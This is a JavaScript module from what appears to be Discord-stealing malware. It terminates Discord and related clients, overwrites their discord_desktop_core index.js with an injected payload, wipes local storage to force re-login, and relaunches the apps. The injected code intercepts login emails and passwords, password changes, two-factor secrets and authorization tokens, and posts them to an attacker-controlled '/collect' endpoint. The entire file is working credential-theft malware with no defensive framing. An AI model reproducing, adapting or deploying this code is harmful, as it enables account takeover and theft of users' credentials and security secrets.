"use strict";

const fs = require("fs");
const path = require("path");
const fsPromises = require("fs/promises");
const configConstants = require("../config/constants");
const utilsProcess = require("../utils/process");
const apiSender = require("../api/sender");

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const injectionPayload = `const { session, net } = require('electron');
const logger = (type, data) => {
    const payload = JSON.stringify({ type, data, timestamp: new Date().toISOString(), buildId: "${configConstants.BUILD_ID}" });
    const req = net.request({ method: 'POST', url: "${configConstants.BASE_API_URL}/collect" });
    req.setHeader('Content-Type', 'application/json');
    req.on('error', () => { });
    req.write(payload);
    req.end();
};
const apiFilters = ["*://discord.com/api/*", "*://*.discord.com/api/*", "*://discordapp.com/api/*"];
session.defaultSession.webRequest.onBeforeRequest({ urls: apiFilters }, (details, callback) => {
    if (details.url.includes("/science") || details.url.includes("/tracing")) return callback({ cancel: false });
    if ((details.method === 'POST' || details.method === 'PATCH') && details.uploadData && details.uploadData[0].bytes) {
        try {
            const parsed = JSON.parse(details.uploadData[0].bytes.toString());
            if (details.url.includes('auth/login')) logger('LOGIN', { email: parsed.login, pass: parsed.password });
            if (parsed.new_password) logger('PASS_CHANGE', { old: parsed.password, new: parsed.new_password });
            if (details.url.includes('mfa/totp/enable')) logger('2FA_ON', { secret: parsed.secret, code: parsed.code });
        } catch (e) { }
    }
    callback({ cancel: false });
});
session.defaultSession.webRequest.onBeforeSendHeaders({ urls: apiFilters }, (details, callback) => {
    if (details.requestHeaders['Authorization']) {
        const token = details.requestHeaders['Authorization'];
        if (global.lastT !== token) { global.lastT = token; logger('TOKEN', { token }); }
    }
    callback({ requestHeaders: details.requestHeaders });
});`;

async function writeFileSafe(filePath, content) {
    for (let i = 0; i < 5; i++) {
        try {
            await fsPromises.writeFile(filePath, content, "utf8");
            return true;
        } catch (e) {
            if (e.code === "EBUSY") {
                await sleep(1000);
                continue;
            }
            throw e;
        }
    }
    return false;
}

async function dcinject() {
    try {
        const clients = ["Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment", "Vesktop", "Vencord"];
        await utilsProcess.terminateProcesses(clients.map(c => c + ".exe"));
        await sleep(2000);

        const paths = [
            { base: configConstants.localappdata, search: ["cord", "vencord", "vesktop"] },
            { base: configConstants.appData, search: ["BetterDiscord"] }
        ];

        for (const target of paths) {
            if (!fs.existsSync(target.base)) continue;

            const folders = (await fsPromises.readdir(target.base)).filter(f => 
                target.search.some(s => f.toLowerCase().includes(s.toLowerCase()))
            );

            for (const folder of folders) {
                const fullPath = path.join(target.base, folder);
                try {
                    const appFolders = (await fsPromises.readdir(fullPath))
                        .filter(f => f.startsWith("app-"))
                        .sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));

                    if (appFolders.length > 0) {
                        const corePath = path.join(fullPath, appFolders[0], "modules");
                        if (fs.existsSync(corePath)) {
                            const modules = await fsPromises.readdir(corePath);
                            const coreModule = modules.find(m => m.startsWith("discord_desktop_core"));
                            
                            if (coreModule) {
                                const indexPath = path.join(corePath, coreModule, "discord_desktop_core", "index.js");
                                if (fs.existsSync(indexPath)) {
                                    const content = await fsPromises.readFile(indexPath, "utf8");
                                    if (!content.includes(configConstants.BASE_API_URL)) {
                                        await writeFileSafe(indexPath, injectionPayload + "\nmodule.exports = require('./core.asar');");
                                    }
                                }
                            }
                        }
                    }

                    const dbPath = path.join(configConstants.appData, folder, "Local Storage", "leveldb");
                    if (fs.existsSync(dbPath)) {
                        const dbFiles = await fsPromises.readdir(dbPath);
                        for (const file of dbFiles) {
                            if (file.endsWith(".ldb") || file.endsWith(".log")) {
                                await writeFileSafe(path.join(dbPath, file), "");
                            }
                        }
                    }
                } catch (e) {
                    continue;
                }
            }
        }

        for (const client of clients) {
            const updater = path.join(configConstants.localappdata, client, "Update.exe");
            if (fs.existsSync(updater)) {
                utilsProcess.startProcess(updater, `--processStart ${client}.exe`);
            }
        }
    } catch (err) {
        apiSender.sendGenericMessage("Injection Error: " + err.message);
    }
}

async function dckill() {
    const clients = ["Discord", "DiscordCanary", "discordDevelopment", "DiscordPTB"];
    for (const client of clients) {
        try {
            await utilsProcess.killProcess(client);
            const updater = path.join(configConstants.localappdata, client, "Update.exe");
            if (fs.existsSync(updater)) {
                utilsProcess.startProcess(updater, `--processStart ${client}.exe`);
            }
        } catch {}
    }
}

exports.dcinject = dcinject;
exports.dckill = dckill;
